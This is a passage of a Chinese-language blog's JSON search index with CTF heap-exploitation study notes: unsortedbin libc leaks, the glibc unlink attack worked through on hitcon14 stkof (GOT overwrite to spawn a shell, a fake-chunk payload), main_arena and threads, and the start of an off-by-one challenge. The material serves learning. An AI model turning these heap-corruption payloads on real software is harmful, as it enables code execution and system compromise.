bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">warning: the debug information found <span class=\"keyword\">in</span> <span class=\"string\">&quot;/usr/lib/debug//lib/x86_64-linux-gnu/ld-2.27.so&quot;</span> does not match <span class=\"string\">&quot;/lib64/ld-linux-x86-64.so.2&quot;</span> (CRC mismatch).</span><br><span class=\"line\">warning: the debug information found <span class=\"keyword\">in</span> <span class=\"string\">&quot;/usr/lib/debug//lib/x86_64-linux-gnu/libc-2.27.so&quot;</span> does not match <span class=\"string\">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span> (CRC mismatch).</span><br></pre></td></tr></table></figure>\n\n<p><code>/lib64/ld-linux-x86-64.so.2</code>是一个软连接，在这里链接的是<code>/lib/x86_64-linux-gnu/ld-2.27.so</code>,也就相当于ld-2.27.so</p>\n","categories":["MESS"],"tags":["mess"]},{"title":"unsortedbin leak","url":"/2021/12/11/unsortedbin%20leak/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​        \n    <div id=\"aplayer-sBJnuoeD\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div>     </p>\n<p>​    一个简单的trick。</p>\n<p>​        并且在trick就是tcache，接下来就是刷题熟练，最后再简单学习一下largin bin和small bin的利用。</p>\n<p>​        unsortedbin  由双向循环链表管理，表头为<code>main_arena</code>，所以表末尾的chunk的fd会指回<code>main_arena</code>，这样我们就获得了<code>main_arena</code>结构体内部的的地址，通过调试我们就能得到<code>main_arena</code>的真正的地址，并且<code>main_arena</code>与libc基地址有固定偏移，就能四舍五入获得libc的基地址。</p>\n<p>​        如何泄露这个fd呢？</p>\n<p>​        一般情况下，可以利用UAF，show出 unsorted chunk的<code>fd</code>。</p>\n<p>​        当bin中只有一个chunk时，由于bin中一般都是干净的，该bin的<code>fd</code>和<code>bk</code>都会指向<code>main_arena</code>中</p>\n<p>​        那么如何得到<code>main_arena</code>与libc的固定偏移呢？</p>\n<p>​        有两种方式：</p>\n<p>​    1:用IDA找到.so文件的 <code>malloc_trim</code> 函数，就可以获得偏移。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span></span><br><span class=\"line\">__malloc_trim (<span class=\"keyword\">size_t</span> s)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> result = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (__malloc_initialized &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    ptmalloc_init ();</span><br><span class=\"line\"></span><br><span class=\"line\">  mstate ar_ptr = &amp;main_arena;<span class=\"comment\">//&lt;=对main_arena进行了访问，用伪代码看到的结果就是main_arena和libc的固定偏移。</span></span><br><span class=\"line\">  <span class=\"keyword\">do</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      __libc_lock_lock (ar_ptr-&gt;mutex);</span><br><span class=\"line\">      result |= mtrim (ar_ptr, s);</span><br><span class=\"line\">      __libc_lock_unlock (ar_ptr-&gt;mutex</span><br><span class=\"line\"></span><br><span class=\"line\">      ar_ptr = ar_ptr-&gt;next;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (ar_ptr != &amp;main_arena);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​        </p>\n<p>2:通过<code>malloc_hook</code>算出。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">main_arena_offset = ELF(<span class=\"string\">&quot;libc.so.6&quot;</span>).symbols[<span class=\"string\">&quot;__malloc_hook&quot;</span>] + <span class=\"number\">0x10</span></span><br></pre></td></tr></table></figure>\n\n\n\n","categories":["HEAP - Unsortedbin"],"tags":["trick"]},{"title":"UNLINK","url":"/2021/12/10/unlink/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-tZxgeThX\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div>     \n\n<h3 id=\"UNLINK\"><a href=\"#UNLINK\" class=\"headerlink\" title=\"UNLINK\"></a>UNLINK</h3><p>​        就是将free chunk从双向循环链表中解链的过程，当然这里的解链一般来说是指在对空闲块进行合并的时候的unlink。借用malloc lab中的简化的unlink的代码，就是：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">SET_PREV(next,prev);</span><br><span class=\"line\">SET_NEXT(prev,next)</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​        也就是把下一个chunk的PREV位设为上一个chunk的bp，把上一个chunk的next位设为下一个chunk的bp。这样把当前chunk空出来，完成了unlink。</p>\n<p>​        在ptmalloc中则是：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">#小写的指fd和bk位，大写指前/后chunk bp</span><br><span class=\"line\">FD=P-&gt;fd #前一个chunk bp = 当前chunk的fd，相当于赋值。</span><br><span class=\"line\">BK=P-&gt;bk# #后一个chunk bp = 当前chunk的bk</span><br><span class=\"line\">FD-&gt;bk = BK #前一个chunk的bk位 = 当前chunk的bk，也就是前一个chunk的bk等于后一个chunk的 bp</span><br><span class=\"line\">BK-&gt;fd = FD #后一个chunk的fd = 前一个chunk的bp</span><br></pre></td></tr></table></figure>\n\n<p>​    </p>\n<p>​    （在这里我一直忽略一个很重要的点，就是<code>p-&gt;fd</code>是一个指针，保存了<code>FD_prevsize</code>的地址，bk同理，于是在unlink时，<code>FD-&gt;bk=BK</code>，其中    <code>FD-&gt;bk</code>的地址是<code>p-&gt;fd+12</code>，但是实际unlink需要的是将这个地址的内容替换为BK，所以应该是<code>*(p-&gt;fd + 12)=BK</code>而不是是<code>(p-&gt;fd + 12)=BK</code></p>\n<p>​        所以在比较远古的版本中，由于glibc没有给unlink做什么检查，导致我们那可以伪造unlink时与前/后连接的chunk，导致申请到伪造的chunk。</p>\n<p>​        （给键盘换了静音轴，感觉会更费力一些，应该买红轴的555）</p>\n<h3 id=\"古早的unlink利用\"><a href=\"#古早的unlink利用\" class=\"headerlink\" title=\"古早的unlink利用\"></a>古早的unlink利用</h3><p>​        ps：有一些内容是参照我之前第一次学习时做的笔记。</p>\n<p>​        刚才说到，unlink的操作是将前一个chunk的bk指针指向后一个chunk，后一个chunk的fd指针指向前一个chunk，我们可以选择通过控制后一个chunk的指针来篡改本来要连接的对象。</p>\n<p>​        举一个例子，如果有两个物理地址连续的small chunk0和small chunk1（这里chunk size必须要大于fastbin，因为fastbin chunk就只是将chunk放进fastbin链表中管理，并且为了效率，每个chunk的<code>prev_inuse</code>位都没有修改，在链表中也不会进行合并），前一个chunk0是allocated，后一个chunk1是free，这时候如果我们释放chunk0，由于两个chunk都是free状态，所以ptmalloc判断两个chunk需要合并，于是首先需要把chunk1从双向循环链表中拿出来与chunk0合并，合并之后再放回去。</p>\n<p>​        这时我篡改chunk0的bk指针指向一个我们希望的<code>target_addr</code>的bp，再将<code>target_addr+8</code>改成chunk0的bp。这样在unlink的时候，实际连接的就是chunk0与<code>target_addr</code>，chunk1就被忽略掉了。</p>\n<p>​        但是在实际的利用中，这样需要修改两个chunk。或者说两个内存块，未免有些麻烦，注意到unlink的操作之前是有一个类似“赋值”的操作的，这里是不是也能够作为攻击的切入点？</p>\n<p>​        <code>FD=P-&gt;fd;BK=P-&gt;bk;FD-&gt;bk = BK;BK-&gt;fd = FD</code>，其实前面的两步虽然不是实际的unlink的操作，但是也十足关键，这两个操作判定了前后chunk的bp，可以说后面unlink操作都是基于前面两步指定的指针来进行的，所以我们只需要把目光投向当前chunk的fd和bk位，修改它们，就相当于同时修改了前一个chunk和<code>target chunk</code>。</p>\n<p>​        那么还是之前举的例子，我们不修改chunk0或target chunk，而是修改chunk1本身。</p>\n<p>​        我们最终的目的还是希望能够通过一个libc函数+参数的形式，执行某些特定的函数。所以我们希望利用unlink修改函数的got表。</p>\n<p>​        比如说为了show某些地址，改<code>free got</code>为<code>puts got</code>，为了getshell，改<code>atoi got</code>为<code>system got</code>。</p>\n<p>​        要修改got表，一个通用的步骤，是先在chunk content上填上got addr，然后将chunk content作为一个指针，分配chunk content指向的内存块，也就是got，再利用edit或者其他东西修改这个内容。</p>\n<p>​        比如我们首先需要伪造一个show的功能，就需要将某个函数的got替换成puts（已经包含的任意输出函数，哦，其实常见的只有puts和printf），比如说经典受害人free（）。</p>\n<p>​        那么又该如何实现这样的效果？</p>\n<p>​        我们可以在<code>FD=P-&gt;fd</code>这一步时将fd赋值为某个<code>got addr -12</code>（这是一个got表值的地址）。然后在<code>BK=P-&gt;bk</code>时给bk赋一个值，比如说<code>system got</code>（这是一个got表值），然后unlink时，<code>FD-&gt;bk = BK</code>，会先找到<code>FD</code>的地址，也就是<code>got addr - 12</code>，然后找到<code>FD</code>的<code>bk</code>指针，也就是<code>got addr  -12 + 12</code>（32位），再解引用，使得找到的<code>FD-&gt;bk</code>的地址对应的内存块的值为<code>BK</code>，也就是我们刚刚篡改过的got的值，这样就成功了。</p>\n<p>​        </p>\n<h3 id=\"例子\"><a href=\"#例子\" class=\"headerlink\" title=\"例子\"></a>例子</h3><h4 id=\"stkof\"><a href=\"#stkof\" class=\"headerlink\" title=\"stkof\"></a>stkof</h4><h5 id=\"检查文件：\"><a href=\"#检查文件：\" class=\"headerlink\" title=\"检查文件：\"></a>检查文件：</h5><p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%884.03.13.png\" alt=\"截屏2021-12-10 下午4.03.13\">    </p>\n<p>​            64位动态链接文件，没开PIE，问题不大。</p>\n<h5 id=\"逆向\"><a href=\"#逆向\" class=\"headerlink\" title=\"逆向\"></a>逆向</h5><p>​        (打开ida的时候又遇到了那个无关紧要但是很令人火大的问题，尝试解决)</p>\n<p>​        ![](<a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10\">https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/截屏2021-12-10</a> 下午4.13.01.png)</p>\n<p>​        </p>\n<p>​        </p>\n<p>​        </p>\n<p>​        到最后还是没有办法解决，确实还是ida的版本问题，没有办法了，就放任吧。</p>\n<p>​        </p>\n<p>​        如何在最短时间内最精准地逆向，一直是个问题。</p>\n<p>​        连个菜单都没有叫什么菜单题嘛。</p>\n<p>main</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%8810.59.01.png\" alt=\"截屏2021-12-10 下午10.59.01\"></p>\n<p>edit</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%8810.59.15.png\" alt=\"截屏2021-12-10 下午10.59.15\"></p>\n<p>​        这里因为输入的size的大小是任意的，就意味着我们能够向chunk中读入无限制的数据，导致堆溢出。</p>\n<p>add</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%8810.59.47.png\" alt=\"截屏2021-12-10 下午10.59.47\"></p>\n<p>​        这里会将content的指针保存在heap[]中。</p>\n<p>free</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%8811.00.18.png\" alt=\"截屏2021-12-10 下午11.00.18\"></p>\n<p>还有这个不知道是干嘛的函数。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%8811.00.42.png\" alt=\"截屏2021-12-10 下午11.00.42\"></p>\n<h5 id=\"漏洞利用思路\"><a href=\"#漏洞利用思路\" class=\"headerlink\" title=\"漏洞利用思路\"></a>漏洞利用思路</h5><p>​        整理一下。还是菜单题，增删改，没有查。改没有限制输入字符的长度，存在堆溢出，查的话需要我们自己改got表然后泄露数据。</p>\n<p>​        libc还是2.23（不过这个好像是14年的题，在当时应该是道难题吧qwq）</p>\n<p>​        首先是因为程序没有设置取消缓冲区，所以在我们输入东西，实际分配chunk之前，程序还会申请一堆chunk用于缓冲，所以为了不影响调试，需要先申请一个大chunk来把这些缓冲区申请了。</p>\n<p>​        想一想，这道题的思路大致是通过unlink改got表然后调用<code>system(&quot;/bin/sh&quot;)</code>来getshell。因为没有show函数，所以需要先利用改got表的方式伪造一个<code>puts()</code>，并且如何通过unlink改got表也是一个问题。</p>\n<p>​        第一步需要将<code>free</code>函数的got表修改为<code>put</code>s函数的got表，这一步我们需要在<code>free got addr</code>处填<code>入puts plt</code>。</p>\n<p>​        在前面介绍unlink利用时，举的例子就是利用unlink改表，那么这种方式能不能用在这道题上呢？</p>\n<p>​        先申请三个chunk，第一个chunk用来填缓冲区，意义不大，第二个chunk用来触发unlink，第三个chunk用来被修改fd和bk。首先非常自然地想到，将chunk3的fd改为free got addr - 0x18，bk改为puts plt。</p>\n<p>​        稍微往后想一下，这样unlink了之后。p-&gt;bk就被完全破坏了，我们只是获得了一个puts函数，但是我们还需要将atoi gots改为system，这样做就无法故技重施了，未免有些破釜沉舟，</p>\n<p>不妨使用一些更加精妙的技巧。由于每个chunk ptr都被保存在heap结构中，所以如果我们能伪造一个fake chunk到heap结构体处，就能修改每个heap[]，也就是对应的chunk ptr为不同函数的got表，这样当我们修改chunk content时，就相当于修改了函数的got表内容了。</p>\n<p>​        所以目前最大的问题是如何伪造一个fake chunk到heap结构体处。</p>\n<p>​        思路就是利用unlink，将chunk2的fd修改为heap2 - 0x18，这样当unlink时，FD= p -&gt;fd  = heap2 - 0x18，相当于chunk2前一个chunk是在heap2 - 0x18的位置，然后FD-&gt;bk = BK，也就是heap2 = BK。这里有两种理解的方式，一种是fake chunk的ptr位于heap2的位置。所以我们能够编辑chunk2（实则是编辑fake chunk）来修改heap结构体储存的chunk ptr。</p>\n<p>​        这样我们就可以修改heap[0]为free got，1为puts got，2为atoi got，然后edit chunk0，将内容编辑为puts的plt表（因为此时chunk0的ptr指针已经被修改为free的got表地址了）</p>\n<p>​        这样我们就获得了puts函数。这时我们puts（1），就能获得chunk1的实际ptr地址，注意这时候这个实际ptr就是puts的got表值，这样我们就可以进行rop获得system的真实地址了。</p>\n<p>​        然后利用类似的步骤将atoi的got表覆盖为system的got表，最后只要发送<code>&quot;/bin/sh&quot;</code>就能getshell。</p>\n<p>​        </p>\n<h5 id=\"实际exp利用\"><a href=\"#实际exp利用\" class=\"headerlink\" title=\"实际exp利用\"></a>实际exp利用</h5><p>​        首先连续申请四个chunk。chunk大小至少是small。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x100</span>)<span class=\"comment\">#0，buffer</span></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>)<span class=\"comment\">#1，trigger unlink</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>)<span class=\"comment\">#2</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-11%20%E4%B8%8B%E5%8D%883.49.08.png\" alt=\"截屏2021-12-11 下午3.49.08\"></p>\n<p>​        利用edit功能，将chunk1伪造成一个free fake chunk。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload = p64(<span class=\"number\">0</span>)  <span class=\"comment\">#prev_size</span></span><br><span class=\"line\"> payload += p64(<span class=\"number\">0x20</span>)  <span class=\"comment\">#size</span></span><br><span class=\"line\"> payload += p64(head + <span class=\"number\">16</span> - <span class=\"number\">0x18</span>)  <span class=\"comment\">#fd</span></span><br><span class=\"line\"> payload += p64(head + <span class=\"number\">16</span> - <span class=\"number\">0x10</span>)  <span class=\"comment\">#bk</span></span><br><span class=\"line\"> payload += p64(<span class=\"number\">0x20</span>)  <span class=\"comment\"># next chunk&#x27;s prev_size bypass the check</span></span><br><span class=\"line\"> payload = payload.ljust(<span class=\"number\">0x30</span>, <span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\"> payload += p64(<span class=\"number\">0x30</span>)<span class=\"comment\"># make it believe that prev chunk is free</span></span><br><span class=\"line\"> payload += p64(<span class=\"number\">0x90</span>)</span><br><span class=\"line\"> edit(<span class=\"number\">2</span>, <span class=\"built_in\">len</span>(payload), payload)</span><br></pre></td></tr></table></figure>\n\n<p>​    </p>\n<p>​        这一段最关键的就是这两句：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload += p64(head + <span class=\"number\">16</span> - <span class=\"number\">0x18</span>)  <span class=\"comment\">#fd</span></span><br><span class=\"line\">payload += p64(head + <span class=\"number\">16</span> - <span class=\"number\">0x10</span>)  <span class=\"comment\">#bk</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>​        当unlink时，操作如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">FD -&gt; bk = BK =&gt; head + <span class=\"number\">16</span> = head + <span class=\"number\">16</span> - <span class=\"number\">0x10</span></span><br><span class=\"line\"></span><br><span class=\"line\">BK -&gt; fd = FD =&gt; head + <span class=\"number\">16</span> -<span class=\"number\">0x10</span> + <span class=\"number\">0x10</span> = head + <span class=\"number\">16</span> = head +<span class=\"number\">16</span> -<span class=\"number\">0x18</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>​        其实就是在head +16（这是一个地址）处填入了head +16 -0x18的内容。</p>\n<p>​        然后非常有趣的是（也是精心构造的结果），head + 16点内容正好就是chunk2 ptr，也就是相当于这个操作使得将chunk2的ptr改成了 head +16 - 0x18。</p>\n<p>​        也就是在<code>head +16 - 0x18</code>处构造了一个fake chunk。后续的利用就简单起来了。</p>\n<p>​        然后进入chunk2的内存空间，首先我们为了将chunk1伪造成一个free块，对于chunk2的域需要修改的就是<code>prev_size</code>和<code>pre_inuse</code>，也就是分别改为0x30和0x90。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​        接着free（2），触发unlink。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-11%20%E4%B8%8B%E5%8D%883.50.09.png\" alt=\"截屏2021-12-11 下午3.50.09\"></p>\n<p>​            如图，从da530开始的就是chunk1，从570开始是chunk2.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">chunk2-&gt;fd = heap[<span class=\"number\">2</span>] - <span class=\"number\">0x18</span></span><br><span class=\"line\">chunk2-&gt;bk = heap[<span class=\"number\">2</span>] - <span class=\"number\">0x10</span></span><br><span class=\"line\"></span><br><span class=\"line\">FD_chunk_bp = chunk2-&gt;fd = heap[<span class=\"number\">2</span>] - <span class=\"number\">0x18</span></span><br><span class=\"line\">BK_chunk_bp = chunk2-&gt;bk = heap[<span class=\"number\">2</span>] - <span class=\"number\">0x10</span></span><br><span class=\"line\">FD_chunk -&gt;bk = *（heap[<span class=\"number\">2</span>] - <span class=\"number\">0x10</span> + <span class=\"number\">0x18</span>） = *heap[<span class=\"number\">2</span>] = </span><br><span class=\"line\">BK_chunk -&gt;fd =  *（heap[<span class=\"number\">2</span>] <span class=\"number\">-0x10</span> + <span class=\"number\">0x10</span> ）= *heap[<span class=\"number\">2</span>]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​        也就是达到了<code>*heap[2] = heap[2] - 0x18</code></p>\n<p>​        </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-11%20%E4%B8%8B%E5%8D%884.27.13.png\" alt=\"截屏2021-12-11 下午4.27.13\"></p>\n<p>​        结果似乎不尽人意，可以看到虽然unlink了，chunk2也被free了，但是似乎并没有达到效果。</p>\n<p>​        </p>\n<p>​    </p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><p><a href=\"https://guyinatuxedo.github.io/30-unlink/hitcon14_stkof/index.html\">hitcon14_stkof</a></p>\n","categories":["HEAP - UNLINK"]},{"title":"main_arana 与多线程","url":"/2021/08/18/main_arana%20%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-rDGhzEpG\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h3 id=\"在学习Tcache的时候遇到了一些比较奇怪的点，ctf权威指南pwn篇中对于Tcache的解释中第一段如下：\"><a href=\"#在学习Tcache的时候遇到了一些比较奇怪的点，ctf权威指南pwn篇中对于Tcache的解释中第一段如下：\" class=\"headerlink\" title=\"在学习Tcache的时候遇到了一些比较奇怪的点，ctf权威指南pwn篇中对于Tcache的解释中第一段如下：\"></a>在学习Tcache的时候遇到了一些比较奇怪的点，ctf权威指南pwn篇中对于Tcache的解释中第一段如下：</h3><blockquote>\n<p>Tcache全名为Thread Local Caching，它为每个线程创建一个缓存，里面包含了一些小堆块，无需对main_arena上锁即可使用。</p>\n</blockquote>\n<p>首先让我感到不解的就是，“无需对main_arena上锁即可使用”这句话。什么叫对main_arana上锁？之前也遇见过很多文章提到过这个”锁“的相关概念，但是它们从来都不是问题的重点，但是通常来说，正是一个个不懂的”无关紧要“的问题导致最后啥也看不懂的。</p>\n<p>所以在这篇文章中我们有必要从ctf pwn的角度去理解线程 main_arena。</p>\n<h4 id=\"加锁\"><a href=\"#加锁\" class=\"headerlink\" title=\"加锁\"></a>加锁</h4><p>当<strong>多个线程同时操作同一个共享全局变量</strong>的时候，对线程上锁，保证同一时间一个对象只有一个线程在访问，可以解决资源占用问题，同时保证了数据的安全性。</p>\n<h4 id=\"线程\"><a href=\"#线程\" class=\"headerlink\" title=\"线程\"></a>线程</h4><p>线程一般来说被进程包含：一个进程可以有很多线程来处理，每条线程并行执行不同的任务。</p>\n<p>比如说ptmalloc2这个是个进程，然后其中包含很多很多线程。</p>\n<p>其中会有一个<code>main_arena</code>,是整个ptmalloc2进程中的主线程，然后main_arena会有很多子线程，每个子线程包含很多连续的内存片段，被称为heap。每一个heap都有自己的heap_header，它们通过链表互相连接，且其中保存了指向其所属arena的指针。</p>\n<p>这么讲似乎有一些太过抽象。具体一点讲就是，在只有一个main_arena的时候，ptmalloc只能通过mmap和sbrk申请堆内存。</p>\n<blockquote>\n<p>在多线程的情况下，显然让所有的线程公用一个数据结构来获取内存块会造成十分惨烈的对锁的竞争，所以 ptmalloc 中间多了一层组织结构——arena。每个arena包含一些可用的内存区块，用一个 arena 级别的锁来控制访问。当线程比较少的时候，每个可以拥有自己的arena，而当 arena 数目超过允许最大值时，多个线程共享一个 arena 了。个线程第一次 malloc 的时候都会 attach 一个 arena 。除非这个 arena 被标记为破坏的（ARENA_CORRUPTION_BIT），否则该线程以后再 malloc 都会继续用这个 arena。</p>\n</blockquote>\n<p>之前ctf权威指南中有讲到，每一个子线程包含很多连续的内存片段，被称为heap。它们都有自己所属的arena。这句话很容易让人觉得——每一个子线程有且只有一个arena，但是还存在多对一的情况。</p>\n<p>但是对于ctf pwn来说，实际情况远远没有这么复杂，基本我们操作的所谓的堆，chunk这些概念，考点基本都是建立在单线程的情况下的，它们的arena也都是<code>main_arena</code>而并不是什么<code>non_main_arena</code>。并且只有<code>main_arena</code>    能够访问<code>heap</code>段，<code>non_main_arena</code>只能访问<code>mmap</code>映射区域。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>用比较简单的话来说，main_arena就是主线程中一个管理所有链表的关键的数据结构，我们可以通过它获得各个bins的偏移。以及利用指向它的fd来做一些不好的事情（）。承接之前的内容，我们在利用main_arena的同时也需要对其进行上锁，防止别的线程与它共用一个资源，然后之前Tcahce里的“无需对main_arena上锁”意思也很清楚了，因为考虑到效率。所以抛弃了一定的安全性。</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://zhuanlan.zhihu.com/p/24909781\">malloc x 线程</a></p>\n<p><a href=\"https://www.wangan.com/docs/1741\">GLibcHeap</a></p>\n","categories":["MESS"],"tags":["mess"]},{"title":"off by one漏洞学习","url":"/2021/06/05/off%20by%20one%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-aqBlwRke\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<p> 学习编写一个堆内存管理程序。</p>\n<p>但是这道题其实是ctf-wiki上关于chunk-overlapping的题。。。</p>\n<p>先看源码。我以后学堆题必从看源码开始。。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">read_input</span><span class=\"params\">(<span class=\"keyword\">char</span> *buf,<span class=\"keyword\">size_t</span> size)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> ret ;</span><br><span class=\"line\">  ret = read(<span class=\"number\">0</span>,buf,size);</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(ret &lt;=<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Error&quot;</span>);</span><br><span class=\"line\">      _exit(<span class=\"number\">-1</span>);</span><br><span class=\"line\">    &#125;\t</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>众所周知基础的off by one出题的时候都是在输入或者字符比较的地方搞名堂，这里也不例外。</p>\n<p>好好的read不用，搞一个readinput制造刻意的漏洞（bushi）</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">heap</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"keyword\">size_t</span> size ;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> *content ;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">heap</span> *<span class=\"title\">heaparray</span>[10];</span></span><br></pre></td></tr></table></figure>\n\n<p>没什么好说的，定义一个管理堆块属性的结构体。以及定义堆指针结构。这里是一个11byte的数组。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">create_heap</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i ;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> buf[<span class=\"number\">8</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">size_t</span> size = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i = <span class=\"number\">0</span> ; i &lt; <span class=\"number\">10</span> ; i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!heaparray[i])&#123;</span><br><span class=\"line\">\t\t\theaparray[i] = (struct heap *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(struct heap));</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(!heaparray[i])&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Allocate Error&quot;</span>);</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span 